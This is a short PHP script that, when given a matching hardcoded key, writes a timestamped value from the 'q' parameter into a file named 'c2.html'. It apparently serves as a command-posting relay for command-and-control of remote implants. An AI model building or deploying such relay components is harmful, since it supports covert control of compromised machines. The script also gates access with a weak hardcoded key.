<?php
$key = 'KDIWXCBKPACVNMZ';
if ($_GET['key'] == $key)
{
    file_put_contents('c2.html', iconv('UTF-8', 'GB2312', 'SFLBU['.time().'#'.htmlspecialchars($_GET['q'], ENT_QUOTES).']'));
}
unset($_GET);
?>